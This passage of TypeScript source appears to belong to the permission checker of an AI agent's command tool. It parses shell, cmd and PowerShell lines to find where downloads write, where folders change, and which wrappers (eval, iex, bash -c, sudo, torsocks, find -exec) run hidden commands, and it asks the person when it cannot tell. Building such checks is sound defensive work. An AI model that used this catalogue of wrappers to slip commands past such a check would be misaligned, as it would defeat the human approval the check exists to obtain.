    // shell opens it before running that command, a group's before entering
    // it (`( cd sub; curl URL ) > f` writes f where the line was, measured).
    for (const r of UNIT_REDIRECTIONS.get(unit) ?? [])
      if (!opened.has(r)) {
        opened.add(r);
        if (r.write) write(besides, r.path);
      }
    if (downloadsToItsOutput(unit)) downloads = true;
    if (unitCategories(unit).includes('download')) {
      downloads = true;
      for (const t of fetcherTargets(program, args)) write(out.targets, t);
    }
    if (move !== undefined) out.dirs.push(move);
  }
  out.dirs.push(...folders.end());
  if (downloads) out.targets.push(...besides);
  return out;
}

const CHANGE_DIR = new Set([
  'cd',
  'chdir',
  'pushd',
  'popd',
  'set-location',
  'sl',
  'push-location',
  'pop-location',
]);

/**
 * The folder a `cd`-like unit moves into; null for home or back (`cd`, `cd ~`,
 * `cd -`, `popd`, `Pop-Location`): where that leads is not in this unit.
 */
function changeDirArg(program: string, args: readonly string[]): string | null {
  if (program === 'popd' || program === 'pop-location') return null;
  // One reading for the three shells (#694): PowerShell's -Path / -LiteralPath
  // as it binds them (`-Pat`, `-LP`, `–Path`, `-Path:x`), which `cd` and
  // `pushd` are aliases of there; otherwise the first positional word, past
  // sh's `-L` / `-P` (PowerShell reads them as -LiteralPath / -Path: the same
  // folder) and cmd's `/d` drive switch (`cd /d D:\x`). `-` goes back: null.
  const bound = bindPsArguments(args, SET_LOCATION);
  const value =
    [...psValues(bound, 'path'), ...psValues(bound, 'literalpath')][0] ??
    psPositional(bound).find((a) => !/^\/d$/i.test(a));
  if (value === undefined || value === '-') return null;
  return value;
}

/**
 * The null sink of the host that runs the command, and nothing else (#669,
 * approbation 0330a0fc du 02/10 : `curl -o /dev/null` lu comme un fichier hors
 * de l'espace interrogeait la personne). THE one exemption every write goes
 * through (a fetcher's output, a pipe writer, a redirection): what is written
 * there lands in no place.
 *
 * - POSIX host: `/dev/null`.
 * - Windows host (the commands run in cmd.exe): `NUL` in any case, with a `:`
 *   or an extension (`nul:`, `nul.json`, `NUL.tar.gz`: the device is what
 *   comes before the first dot). Not PowerShell's `$null`: the shell
 *   run_command uses on Windows is cmd.exe, where `$null` is a plain file name, so
 *   it is read as a variable the shell decides (it asks). A PowerShell payload
 *   that really means the null device over-asks, which a safety net may do.
 *
 * Every other name is an ordinary place, judged like any path and shown as
 * written: `/dev/zero`, `/dev/tty`, `CON`, and the descriptor aliases
 * (`/dev/stdin`, `/dev/stdout`, `/dev/fd/N`) whose target depends on
 * redirections and descriptor copies the text may not show (`3<f 0<&3`).
 * `/dev/null` on a Windows host is one too: cmd.exe reads it as `\dev\null` of
 * the current drive. The price is a few harmless asks (`-o /dev/stdout`); the
 * gain, an exemption that can never hide a write. Only the bare name: `nul/a.json`
 * or `/tmp/dev/null` are places. A tool's own `-` for its standard output is
 * read where the tool is (`curl -o -`, `wget -O -`): for a shell redirection or
 * `tee`, `-` is a file. What KIND of action the line is does not change: only
 * where it writes.
 */
function isNullSink(p: string, host: ShellHost): boolean {
  return host === 'windows' ? WINDOWS_NUL.test(p) : p === '/dev/null';
}

const WINDOWS_NUL = /^nul(?::|\.[^\\/]*)?$/i;

/**
 * A path as written, or null when the shell decides it at run time: a
 * variable (`$x`, `%X%`, cmd's delayed `!X!`), a substitution, the home
 * folder (`~`), a PowerShell splat (`@opts`). THE reading of a word a command
 * acts on, for every kind (#715): where a download writes, where a line moves,
 * what a delete removes.
 */
export function readablePath(p: string): string | null {
  if (p === '' || /[$%`]/.test(p) || p.startsWith('~') || /![^!\s]+!/.test(p) || isSplat(p))
    return null;
  return p;
}

/** The value of a flag written `-f v`, `-fv` (short only), `--flag=v` or `-Flag:v`. */
function flagValues(
  args: readonly string[],
  matches: (flag: string) => boolean,
  attachedShort?: string,
): string[] {
  const values: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i] ?? '';
    const eq = a.match(/^(--?[\w-]+)[=:](.*)$/);
    if (eq && matches(eq[1] ?? '')) values.push(eq[2] ?? '');
    else if (matches(a)) values.push(args[i + 1] ?? '');
    else if (attachedShort && a.startsWith(attachedShort) && a.length > attachedShort.length)
      values.push(a.slice(attachedShort.length));
  }
  return values;
}

/**
 * The short options of a fetcher that take a value (from each program's
 * manual). In a group (`-sLo x`, `-sLox`, `-qO-`), options without a value
 * stack, and the first one that takes a value takes the rest of the group, or
 * the next word when the group ends with it: `-XPOST` is `-X POST`, not an
 * `-O` (#614, revue Nodal de la PR #618, passe 3).
 */
const SHORT_VALUE_OPTIONS: Record<'curl' | 'wget' | 'aria2c', string> = {
  curl: 'AbcCdDeEFHKmoPQrtTuUwxXyYz',
  wget: 'aABDeIilOoPQRtTUwX',
  aria2c: 'dijklmostUx',
};

/** Every short option of `args` as the program reads it, with its value ('' for a switch). */
function shortOptions(
  args: readonly string[],
  program: keyof typeof SHORT_VALUE_OPTIONS,
): Array<{ option: string; value: string }> {
  const takesValue = SHORT_VALUE_OPTIONS[program];
  const read: Array<{ option: string; value: string }> = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i] ?? '';
    if (!/^-[A-Za-z]/.test(a)) continue;
    for (let j = 1; j < a.length; j++) {
      const option = a[j] ?? '';
      if (!takesValue.includes(option)) {
        read.push({ option, value: '' });
        continue;
      }
      const rest = a.slice(j + 1);
      read.push({ option, value: rest !== '' ? rest : (args[++i] ?? '') });
      break;
    }
  }
  return read;
}

/** The values a program's short option `option` was given. */
function shortValues(
  args: readonly string[],
  program: keyof typeof SHORT_VALUE_OPTIONS,
  option: string,
): string[] {
  return shortOptions(args, program)
    .filter((o) => o.option === option)
    .map((o) => o.value);
}

function joinPath(dir: string, name: string): string {
  if (/^([A-Za-z]:)?[\\/]/.test(name)) return name;
  return dir === '.' ? name : `${dir.replace(/[\\/]$/, '')}/${name}`;
}

/** Where one download unit writes, by program; null where the text does not say. */
function fetcherTargets(program: string, args: readonly string[]): Array<string | null> {
  const lower = args.map((a) => a.toLowerCase());
  switch (program) {
    case 'curl': {
      const outDir = flagValues(args, (f) => f === '--output-dir')[0];
      const files = [
        ...flagValues(args, (f) => f === '--output'),
        ...shortValues(args, 'curl', 'o'),
      ];
      const remote =
        args.some((a) => /^--remote-name(-all)?$/.test(a)) ||
        shortOptions(args, 'curl').some((o) => o.option === 'O');
      const targets = files.filter((f) => f !== '-').map((f) => joinPath(outDir ?? '.', f));
      if (remote) targets.push(outDir ?? '.');
      return targets;
    }
    case 'wget': {
      const docs = [
        ...flagValues(args, (f) => f === '--output-document'),
        ...shortValues(args, 'wget', 'O'),
      ];
      const logs = [
        ...flagValues(args, (f) => f === '--output-file' || f === '--append-output'),
        ...shortValues(args, 'wget', 'o'),
        ...shortValues(args, 'wget', 'a'),
      ];
      const prefix = [
        ...flagValues(args, (f) => f === '--directory-prefix'),
        ...shortValues(args, 'wget', 'P'),
      ][0];
      const targets = [...docs.filter((d) => d !== '-'), ...logs].map((f) =>
        joinPath(prefix ?? '.', f),
      );
      if (docs.length === 0) targets.push(prefix ?? '.');
      return targets;
    }
    case 'invoke-webrequest':
    case 'iwr':
    case 'invoke-restmethod':
    case 'irm':
      // Without -OutFile the content is returned, not written.
      return psValues(bindPsArguments(args, INVOKE_WEB_REQUEST), 'outfile');
    case 'start-bitstransfer': {
      const dest = psValues(bindPsArguments(args, START_BITS_TRANSFER), 'destination');
      // Positional destination: which word is a value and which a switch is
      // not readable without the cmdlet's signature, so it asks.
      return dest.length > 0 ? dest : [null];
    }
    case 'aria2c': {
      const dir =
        [...flagValues(args, (f) => f === '--dir'), ...shortValues(args, 'aria2c', 'd')][0] ?? '.';
      const outs = [...flagValues(args, (f) => f === '--out'), ...shortValues(args, 'aria2c', 'o')];
      return outs.length > 0 ? outs.map((o) => joinPath(dir, o)) : [dir];
    }
    case 'git': {
      // `git [global options] clone [options] URL [DIR]`, and `git -C dir lfs pull`.
      const base = flagValues(args, (f) => f === '-C')[0] ?? '.';
      const sub = lower.indexOf('clone');
      if (sub < 0) return [base];
      const rest = args.slice(sub + 1);
      const positional: string[] = [];
      for (let i = 0; i < rest.length; i++) {
        const a = rest[i] ?? '';
        if (a.startsWith('-')) {
          if (!a.includes('=') && GIT_CLONE_VALUE_FLAGS.has(a)) i++;
          continue;
        }
        positional.push(a);
      }
      const separate = flagValues(rest, (f) => f === '--separate-git-dir');
      return [joinPath(base, positional[1] ?? '.'), ...separate];
    }
    case 'pip':
    case 'pip3':
      return [flagValues(args, (f) => f === '-d' || f === '--dest', '-d')[0] ?? '.'];
    case 'hf':
    case 'huggingface-cli':
      // Without --local-dir, the Hugging Face cache: the program's own store.
      return flagValues(args, (f) => f === '--local-dir');
    case 'comfy':
    case 'ollama':
    case 'docker':
    case 'podman':
    case 'docker-compose':
    case 'podman-compose':
      // Their own store (the ComfyUI install, the model or image store): the
      // command names no path.
      return [];
    default:
      // A fetcher this reading does not know the flags of: it asks.
      return [null];
  }
}

/** `git clone` options that take a value as the next word. */
const GIT_CLONE_VALUE_FLAGS = new Set([
  '-b',
  '--branch',
  '-o',
  '--origin',
  '-c',
  '--config',
  '-u',
  '--upload-pack',
  '-j',
  '--jobs',
  '--depth',
  '--reference',
  '--reference-if-able',
  '--separate-git-dir',
  '--template',
  '--filter',
  '--shallow-since',
  '--shallow-exclude',
  '--server-option',
  '--bundle-uri',
]);

/** The cmdlets that write what a pipe hands them. */
const PIPE_WRITERS: Record<string, PsSignature> = {
  'out-file': OUT_FILE,
  'set-content': SET_CONTENT,
  'add-content': SET_CONTENT,
  'tee-object': TEE_OBJECT,
};

/**
 * Where a program at the end of a pipe writes what it reads: `Out-File x`,
 * `tee x`. A cmdlet's path is its -Path / -FilePath / -LiteralPath or its
 * first positional word, bound as PowerShell binds them (#694); null when a
 * word the binding cannot place hides which word that is.
 */
function pipeWriterTargets(program: string, args: readonly string[]): Array<string | null> {
  const sig = PIPE_WRITERS[program];
  if (sig !== undefined) {
    const bound = bindPsArguments(args, sig);
    const named = ['path', 'filepath', 'literalpath'].flatMap((p) => psValues(bound, p));
    if (named.length > 0) return named;
    if (psHasUnknownParameter(bound)) return [null];
    return psPositional(bound).slice(0, 1);
  }
  if (program === 'tee') return args.filter((a) => !a.startsWith('-'));
  return [];
}

/** True when `re` matches at the very start of `text`. */
function startsWithMatch(re: RegExp, text: string): boolean {
  const m = new RegExp(re.source, re.flags.replace('g', '')).exec(text);
  return m !== null && m.index === 0;
}

/**
 * Which shell reads a line or a list of words. The shell of the WRAPPER that
 * runs it, whatever the line around was (review of PR #682, pass 2): `cmd /c`
 * → cmd, `powershell -Command` → PowerShell, `sh -c` / `wsl` → a POSIX shell,
 * `timeout`, `sudo`, `Start-Process`… → no shell, the program is executed.
 * It decides where a command ends and how quotes and escapes read (pass 3,
 * `splitQuotedShellWords`), and that `start` is cmd's, with a window title,
 * only in cmd (in PowerShell it is Start-Process).
 */
type LineShell = 'cmd' | 'powershell' | 'sh' | 'exec';

/**
 * What a program that runs another one starts: a line read again, or the words
 * of a program. `sourced`: the words name a file the shell reads itself (sh's
 * `.` and `source`), whatever its name (#717).
 */
type Payload =
  | { line: string; shell: LineShell }
  | { words: ShellWord[]; shell: LineShell; invoked?: boolean; sourced?: boolean };

/**
 * The words after a program's options: `-x`, `--long`, `--long=v`, and for the
 * options in `valued`, the word that follows. `--` ends them.
 */
function afterOptions(args: readonly ShellWord[], valued: ReadonlySet<string>): ShellWord[] {
  let i = 0;
  while (i < args.length) {
    const w = args[i]?.text ?? '';
    if (w === '--') return args.slice(i + 1);
    if (!/^-./.test(w)) break;
    i += valued.has(w) ? 2 : 1;
  }
  return args.slice(i);
}

const argv = (words: readonly ShellWord[], shell: LineShell = 'exec'): Payload[] =>
  words.length > 0 ? [{ words: [...words], shell }] : [];

/** One of `names` among a program's words. */
const hasAny = (args: readonly ShellWord[], names: readonly string[]): boolean =>
  args.some((a) => names.includes(a.text));

/** The words after a leading number (`chrt 10 cmd`). */
const afterNumber = (args: readonly ShellWord[]): ShellWord[] =>
  /^\d+$/.test(args[0]?.text ?? '') ? args.slice(1) : [...args];

/** `-c LINE` / `--command LINE`, read by a POSIX shell (`su -c`, `runuser -c`, `expect -c`). */
function commandOption(args: readonly ShellWord[]): Payload[] {
  const i = args.findIndex((a) => a.text === '-c' || a.text === '--command');
  const line = i < 0 ? undefined : args[i + 1];
  return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
}

/** strace/ltrace options that take a value. */
const TRACE_VALUED = new Set([
  '-o',
  '-e',
  '-p',
  '-s',
  '-u',
  '-E',
  '-I',
  '-a',
  '-P',
  '-X',
  '-O',
  '-S',
  '-b',
]);

/** GNU parallel's options that take the next word as their value. */
const PARALLEL_VALUED = new Set([
  '-a',
  '--arg-file',
  '-C',
  '--colsep',
  '-d',
  '--delimiter',
  '-E',
  '-I',
  '-j',
  '--jobs',
  '-P',
  '--max-procs',
  '-L',
  '--max-lines',
  '-n',
  '--max-args',
  '-N',
  '-s',
  '--max-chars',
  '-S',
  '--sshlogin',
  '--sshloginfile',
  '--slf',
  '--basefile',
  '--bf',
  '--block',
  '--block-size',
  '--delay',
  '--env',
  '--halt',
  '--header',
  '--joblog',
  '--load',
  '--memfree',
  '--nice',
  '--results',
  '--res',
  '--retries',
  '--return',
  '--tagstring',
  '--timeout',
  '--tmpdir',
  '--transferfile',
  '--tf',
  '--workdir',
  '--wd',
]);

/** `sh -c LINE`, `bash -lc LINE`, `zsh -o pipefail -c LINE`: a script file is not opened here. */
function shellLine(args: readonly ShellWord[]): Payload[] {
  for (let i = 0; i < args.length; i++) {
    const w = args[i]?.text ?? '';
    if (/^-[a-z]*c[a-z]*$/i.test(w)) {
      const line = args[i + 1];
      return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
    }
    if (w === '-o' || w === '+o') i += 1;
    else if (!/^[-+]/.test(w)) return [];
  }
  return [];
}

/**
 * What `cmd /c` reads again: its own command line from the word after `/c`.
 * Read by cmd, that is the raw text (quotes and all); handed over by another
 * shell, the words as a program receives them, a quoted one quoted again.
 * `cmd /s /c "…"`: the outer quotes of that line are cmd's.
 */
function cmdLine(rest: readonly ShellWord[], from: LineShell): Payload[] {
  if (rest.length === 0) return [];
  const raw = (
    from === 'cmd' && rest[0]?.tail !== undefined
      ? rest[0].tail
      : rest.map((w) => (w.quoted ? `"${w.text}"` : w.text)).join(' ')
  ).trim();
  const line = raw.length >= 2 && raw.startsWith('"') && raw.endsWith('"') ? raw.slice(1, -1) : raw;
  return [{ line, shell: 'cmd' }];
}

/** A payload whose program is decided at run time: it asks (`isDecidedAtRunTime`). */
const DECIDED_AT_RUN_TIME: Payload[] = [
  { words: [{ text: '$(…)', quoted: false }], shell: 'powershell', invoked: true },
];

/** A shell's reserved word that comes before a command it runs: `do rm x`, `then lp x`. */
const before = (args: readonly ShellWord[], shell: LineShell): Payload[] => argv(args, shell);

/** cmd's comparison operators: `a EQU b`, `a NEQ b`… */
const CMD_COMPARE = new Set(['==', 'equ', 'neq', 'lss', 'leq', 'gtr', 'geq']);

/**
 * The command of a cmd `if`, after its condition (#635, review of PR #683):
 * `exist <path>`, `errorlevel <n>`, `cmdextversion <n>`, `defined <var>`,
 * `<a>==<b>` glued or not, `<a> EQU|NEQ|LSS|LEQ|GTR|GEQ <b>`, after `/i` and
 * `not`. A condition of another form runs nothing this reading can name.
 */
function cmdIfCommand(args: readonly ShellWord[]): Payload[] {
  const word = (k: number): string => (args[k]?.text ?? '').toLowerCase();
  let i = 0;
  if (word(i) === '/i') i++;
  if (word(i) === 'not') i++;
  let end: number | null = null;
  if (['exist', 'errorlevel', 'cmdextversion', 'defined'].includes(word(i))) end = i + 2;
  else if (/^[^=]+==[^=]*$|^[^=]*==[^=]+$/.test(args[i]?.text ?? '')) end = i + 1;
  else if (CMD_COMPARE.has(word(i + 1))) end = i + 3;
  return end === null ? [] : argv(args.slice(end), 'cmd');
}

/**
 * Programs whose purpose is to run another program, each with its own option
 * grammar (#667, review of PR #682, pass 2). ONE mechanism: what they run is
 * read as a command of its own, for every kind of action, and the program
 * itself stays a unit. Every entry of `SHELL_PROGRAMS` (shell-programs.ts, the
 * same knowledge for the command allowlist) has one here, a test says so; a
 * program that defines rather than runs (`doskey`) runs nothing.
 */
const RUNS_ANOTHER: Record<string, (args: readonly ShellWord[], shell: LineShell) => Payload[]> = {
  // shells
  cmd: (args, shell) => {
    // Every switch before /c, /k or /r is cmd's own (`/q /d /s /v:on`).
    for (let i = 0; i < args.length; i++) {
      const w = (args[i]?.text ?? '').toLowerCase();
      if (w === '/c' || w === '/k' || w === '/r') return cmdLine(args.slice(i + 1), shell);
      if (!/^\/\w/.test(w)) return [];
    }
    return [];
  },
  // PowerShell joins the words after -Command into its script.
  // A script that is only a variable (`-Command $c`, expanded by sh) is code
  // decided at run time.
  powershell: (args) => {
    // -Command as the CLI binds it (`-c`, `-Com`, `/c`, `--command`), #694;
    // a script (-File, a first positional word) ends the reading before it.
    const command = bindPsArguments(
      args.map((a) => a.text),
      POWERSHELL_CLI,
    ).find((b) => b.names?.includes('command'));
    const rest = command === undefined ? [] : args.slice(command.index);
    if (rest.length === 1 && /^\$[\w:]+$/.test(rest[0]?.text ?? '')) return DECIDED_AT_RUN_TIME;
    return rest.length === 0
      ? []
      : [{ line: rest.map((a) => a.text).join(' '), shell: 'powershell' }];
  },
  sh: shellLine,
  bash: shellLine,
  zsh: shellLine,
  ksh: shellLine,
  csh: shellLine,
  tcsh: shellLine,
  dash: shellLine,
  ash: shellLine,
  fish: shellLine,
  // `wsl [-d distro] [-u user] [--cd dir] cmd…`: the distribution's shell reads
  // it; `-e` executes it; `--list`, `--shutdown` and the rest manage WSL.
  wsl: (args) => {
    const valued = new Set(['-d', '--distribution', '-u', '--user', '--cd', '--distribution-id']);
    for (let i = 0; i < args.length; i++) {
      const w = args[i]?.text ?? '';
      if (valued.has(w)) i += 1;
      else if (w === '-e' || w === '--exec') return argv(args.slice(i + 1));
      else if (w === '--') return argv(args.slice(i + 1), 'sh');
      else if (/^-/.test(w)) return [];
      else return argv(args.slice(i), 'sh');
    }
    return [];
  },
  busybox: (args) => argv(afterOptions(args, new Set())),
  eval: (args) =>
    args.length > 0 ? [{ line: args.map((a) => a.text).join(' '), shell: 'sh' }] : [],
  script: (args) => {
    const i = args.findIndex((a) => a.text === '-c' || a.text === '--command');
    const line = i < 0 ? undefined : args[i + 1];
    return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
  },
  // launchers
  env: (args) => {
    const valued = new Set(['-u', '--unset', '-C', '--chdir']);
    let i = 0;
    while (i < args.length) {
      const w = args[i]?.text ?? '';
      if (w === '-S' || w === '--split-string') {
        const line = args[i + 1];
        return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
      }
      if (w === '--') i += 1;
      else if (valued.has(w)) i += 2;
      else if (/^-/.test(w) || /^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) i += 1;
      else break;
    }
    return argv(args.slice(i));
  },
  sudo: (args) =>
    argv(
      afterOptions(
        args,
        new Set(['-u', '-g', '-C', '-D', '-h', '-p', '-r', '-t', '-U', '-T', '--user', '--group']),
      ),
    ),
  doas: (args) => argv(afterOptions(args, new Set(['-u', '-C']))),
  nohup: (args) => argv(afterOptions(args, new Set())),
  nice: (args) => argv(afterOptions(args, new Set(['-n', '--adjustment']))),
  time: (args) => argv(afterOptions(args, new Set(['-f', '-o', '--format', '--output']))),
  // GNU `timeout [options] DURATION cmd…`; Windows' `timeout /t 5` only waits.
  timeout: (args) => {
    const rest = afterOptions(args, new Set(['-s', '--signal', '-k', '--kill-after']));
    if (!/^\d+(\.\d+)?[smhd]?$/.test(rest[0]?.text ?? '')) return [];
    return argv(rest.slice(1));
  },
  // ── exec wrappers (review of PR #682, pass 5): each runs the command that
  // follows its own options, as it is, in another process state.
  setsid: (args) => argv(afterOptions(args, new Set())),
  stdbuf: (args) =>
    argv(afterOptions(args, new Set(['-i', '-o', '-e', '--input', '--output', '--error']))),
  // With `-p PID` they act on a running process: the word left is a number.
  ionice: (args) => argv(afterOptions(args, new Set(['-c', '-n', '--class', '--classdata']))),
  // `chrt [options] PRIORITY cmd…`
  chrt: (args) => argv(afterNumber(afterOptions(args, new Set()))),
  // `taskset [options] MASK|LIST cmd…`
  taskset: (args) => argv(afterOptions(args, new Set()).slice(1)),
  unbuffer: (args) => argv(afterOptions(args, new Set())),
  strace: (args) => argv(afterOptions(args, TRACE_VALUED)),
  ltrace: (args) => argv(afterOptions(args, TRACE_VALUED)),
  valgrind: (args) => argv(afterOptions(args, new Set())),
  // `watch` hands its words to `sh -c` (`-x` executes them).
  watch: (args) => {
    const rest = afterOptions(args, new Set(['-n', '--interval', '-q', '--equexit']));
    if (rest.length === 0) return [];
    return hasAny(args, ['-x', '--exec'])
      ? argv(rest)
      : [{ line: rest.map((a) => a.text).join(' '), shell: 'sh' }];
  },
  // `flock [options] FILE cmd…` or `flock [options] FILE -c LINE`; `flock FD` runs nothing.
  flock: (args) => {
    const rest = afterOptions(args, new Set(['-w', '--timeout', '-E', '--conflict-exit-code']));
    const after = rest.slice(1);
    const c = after.findIndex((a) => a.text === '-c' || a.text === '--command');
    if (c >= 0) {
      const line = after[c + 1];
      return line === undefined ? [] : [{ line: line.text, shell: 'sh' }];
    }
    return argv(after);
  },
  // `chroot [options] NEWROOT [cmd…]`
  chroot: (args) => argv(afterOptions(args, new Set()).slice(1)),
  unshare: (args) =>
    argv(
      afterOptions(
        args,
        new Set([
          '-S',
          '--setuid',
          '-G',
          '--setgid',
          '--map-user',
          '--map-group',
          '-R',
          '--root',
          '-w',
          '--wd',
        ]),
      ),
    ),
  nsenter: (args) =>
    argv(afterOptions(args, new Set(['-t', '--target', '-S', '--setuid', '-G', '--setgid']))),
  'systemd-run': (args) =>
    argv(
      afterOptions(
        args,
        new Set([
          '-p',
          '--property',
          '-u',
          '--unit',
          '-E',
          '--setenv',
          '--uid',
          '--gid',
          '-M',
          '--machine',
          '-H',
          '--host',
          '--description',
          '--slice',
          '--working-directory',
          '--on-calendar',
          '--on-active',
        ]),
      ),
    ),
  firejail: (args) => argv(afterOptions(args, new Set())),
  // macOS: `caffeinate [-disu] [-t seconds] [-w pid] [utility args]`
  caffeinate: (args) => argv(afterOptions(args, new Set(['-t', '-w']))),
  builtin: (args) => argv(args),
  pkexec: (args) => argv(afterOptions(args, new Set(['--user']))),
  // `su [user] -c LINE`, `runuser -u user -- cmd…` / `runuser -c LINE`
  su: (args) => commandOption(args),
  runuser: (args) => {
    const line = commandOption(args);
    return line.length > 0
      ? line
      : argv(afterOptions(args, new Set(['-u', '--user', '-g', '--group', '-G', '-s', '--shell'])));
  },
  proxychains: (args) => argv(afterOptions(args, new Set(['-f']))),
  torsocks: (args) => argv(afterOptions(args, new Set(['-u', '-p', '-a', '-P']))),
  eatmydata: (args) => argv(afterOptions(args, new Set())),
  fakeroot: (args) => argv(afterOptions(args, new Set(['-l', '-s', '-i']))),
  'dbus-launch': (args) => argv(afterOptions(args, new Set())),
  // `expect -c "spawn cmd…"`: Tcl, whose `spawn` starts a program.
  expect: (args) => commandOption(args),
  spawn: (args) => argv(afterOptions(args, new Set())),
  exec: (args) => argv(afterOptions(args, new Set(['-a']))),
  // `command -v x` only looks x up.
  command: (args) =>
    args.some((a) => a.text === '-v' || a.text === '-V') ? [] : argv(afterOptions(args, new Set())),
  xargs: (args) =>
    argv(
      afterOptions(
        args,
        new Set(['-I', '-n', '-P', '-L', '-s', '-d', '-E', '-a', '--max-args', '--max-procs']),
      ),
    ),
  // `runas [/user:x] [/savecred…] "program args"`: one command line.
  runas: (args) => {
    const rest = args.filter((a) => !/^\/\w/.test(a.text));
    return rest[0] === undefined ? [] : [{ line: rest[0].text, shell: 'exec' }];
  },
  call: (args) => argv(args, 'cmd'),
  // cmd's `for %f in (set) do command`.
  for: (args) => {
    const i = args.findIndex((a) => a.text.toLowerCase() === 'do');
    return i < 0 ? [] : argv(args.slice(i + 1), 'cmd');
  },
  doskey: () => [],
  // cmd's start, PowerShell's Start-Process: what it starts, with its arguments.
  start: (args) => launchedWords('start', args),
  'start-process': (args) => launchedWords('start-process', args),
  saps: (args) => launchedWords('saps', args),
  // GNU parallel: `parallel [options] command [::: args]`. Its command is
  // composed with each input and handed to the shell (#715, Nodal review
  // pass 1): read as a line, up to the first `:::` / `::::` separator.
  parallel: (args) => {
    const end = args.findIndex((a) => /^::::?\+?$/.test(a.text));
    const command = afterOptions(end < 0 ? args : args.slice(0, end), PARALLEL_VALUED);
    return command.length === 0
      ? []
      : [{ line: command.map((a) => a.text).join(' '), shell: 'sh' }];
  },
  // fd: `-x`/`--exec` runs a command per file found, `-X`/`--exec-batch`
  // once with all of them, its words up to a `;` (#715, Nodal review pass 1).
  fd: (args) => {
    const payloads: Payload[] = [];
    for (let i = 0; i < args.length; i++) {
      const word = args[i]?.text ?? '';
      const glued = /^--exec(?:-batch)?=(.+)$/.exec(word)?.[1];
      if (glued === undefined && !['-x', '--exec', '-X', '--exec-batch'].includes(word)) continue;
      const end = args.findIndex((a, j) => j > i && [';', '\\;'].includes(a.text));
      const words = args.slice(i + 1, end > i ? end : undefined);
      payloads.push(
        ...argv(glued === undefined ? words : [{ text: glued, quoted: false }, ...words]),
      );
      if (end > i) i = end;
    }
    return payloads;
  },
  // `find … -exec cmd {} ;`, each of them.
  find: (args) => {
    const payloads: Payload[] = [];
    for (let i = 0; i < args.length; i++) {
      if (!['-exec', '-execdir', '-ok', '-okdir'].includes(args[i]?.text ?? '')) continue;
      const end = args.findIndex((a, j) => j > i && [';', '\\;', '+'].includes(a.text));
      payloads.push(...argv(args.slice(i + 1, end > i ? end : undefined)));
      if (end > i) i = end;
    }
    return payloads;
  },
  // PowerShell's Invoke-Expression: the string is code, read by PowerShell.
  // Without one it runs what the pipeline hands it (inline code, `isInlineEvalUnit`).
  // Its code is a string the text holds (`iex 'Get-Date'`, a literal piped in,
  // bound as its argument by `scanLine`), or one it does not: a variable, an
  // expression, a command's output (`iex $c`, `iex (…)`, `Get-Content x | iex`),
  // decided at run time (review of PR #682, pass 8).
  iex: (args) => {
    const rest = args.filter((a) => !isPsParameter(a.text, INVOKE_EXPRESSION, 'command'));
    return rest.length === 0 || rest.some((a) => !a.quoted && /^[$(@]/.test(a.text))
      ? DECIDED_AT_RUN_TIME
      : [{ line: rest.map((a) => a.text).join(' '), shell: 'powershell' }];
  },
  // The call and dot-source operators run what they name, even a `$variable`.
  '&': (args, shell) => (args.length > 0 ? [{ words: [...args], shell, invoked: true }] : []),
  '.': (args, shell) =>
    args.length > 0 ? [{ words: [...args], shell, invoked: true, sourced: true }] : [],
  source: (args, shell) => (args.length > 0 ? [{ words: [...args], shell, sourced: true }] : []),
  // a POSIX shell's reserved words before a command (`for …; do rm $f; done`)
  do: before,
  then: before,
  else: before,
  elif: before,
  // cmd's `if [/i] [not] <condition> <command>`: the command after the
  // condition (#635, review of PR #683). sh's condition is itself a command.
  if: (args, shell) => (shell === 'cmd' ? cmdIfCommand(args) : before(args, shell)),
  while: before,
  until: before,
  '!': before,
  // `coproc [NAME] command`: the command runs in the background (#635).
  coproc: before,
};
RUNS_ANOTHER['pwsh'] = RUNS_ANOTHER['powershell'] as (typeof RUNS_ANOTHER)[string];
RUNS_ANOTHER['invoke-expression'] = RUNS_ANOTHER['iex'] as (typeof RUNS_ANOTHER)[string];
RUNS_ANOTHER['gtimeout'] = RUNS_ANOTHER['timeout'] as (typeof RUNS_ANOTHER)[string];
RUNS_ANOTHER['proxychains4'] = RUNS_ANOTHER['proxychains'] as (typeof RUNS_ANOTHER)[string];
// Debian and Ubuntu install fd as `fdfind`.
RUNS_ANOTHER['fdfind'] = RUNS_ANOTHER['fd'] as (typeof RUNS_ANOTHER)[string];

/**
 * Where the programs of `RUNS_ANOTHER` run what they name, per shell that
 * reads them (#717):
 * - `own`: in that shell's process, its own builtins and keywords;
 * - `maybe`: in that process, but only when a condition holds: cmd's `if`
 *   and `for` (and the `else` and `do` its parentheses leave), whose command
 *   may never run (Nodal review of PR #721, P1). A folder moved there leaves
 *   the line in a folder not known. sh's bodies (`then`, `do`…) are read by
 *   the scan, which sees where they end (`Processes`);
 * - `not-known`: in its process in one shell the host may be, not in another.
 *   The posix host's /bin/sh is dash on Debian and Ubuntu, bash elsewhere:
 *   dash has no `source` and no `builtin`, and its `time` is a program. A
 *   folder moved there, or a script sourced, leaves the line in a folder the
 *   text does not establish (invariant #4). `.` is POSIX: `own`.
 * Any other one starts a process of its own (`cmd /c`, `bash -c`,
 * `powershell -Command`, `sudo`, `env`, `xargs`, `find -exec`, `start`,
 * `nohup`, `exec`…), or, named in a shell that does not have it, runs
 * nothing: either way, a folder it moves into is not the line's. PowerShell's
 * call operator `&` keeps its runspace; read with PowerShell's grammar for
 * another shell's line (`downloadWrites`), it only marks where the next
 * command starts, in the same process.
 */
const RUNS_IN_PROCESS: Record<LineShell, ReadonlyMap<string, 'own' | 'maybe' | 'not-known'>> = {
  sh: new Map([
    ...['eval', '.', 'command', 'do', 'then', 'else', 'elif', 'if', 'while', 'until', '!', '&'].map(
      (name) => [name, 'own'] as const,
    ),
    ...['source', 'builtin', 'time'].map((name) => [name, 'not-known'] as const),
  ]),
  // `do` and `else` start the command of a `for` and an `if` once their
  // parentheses have cut the line (`for %d in (a) do cd %d`).
  cmd: new Map([
    ...['call', '&'].map((name) => [name, 'own'] as const),
    ...['for', 'if', 'do', 'else'].map((name) => [name, 'maybe'] as const),
  ]),
  powershell: new Map(
    ['iex', 'invoke-expression', '&', '.', 'if', 'else', 'while', 'do', 'until'].map(
      (name) => [name, 'own'] as const,
    ),
  ),
  exec: new Map(),
};

/**
 * Words that name a shell's keyword, builtin, alias or cmdlet, not a file:
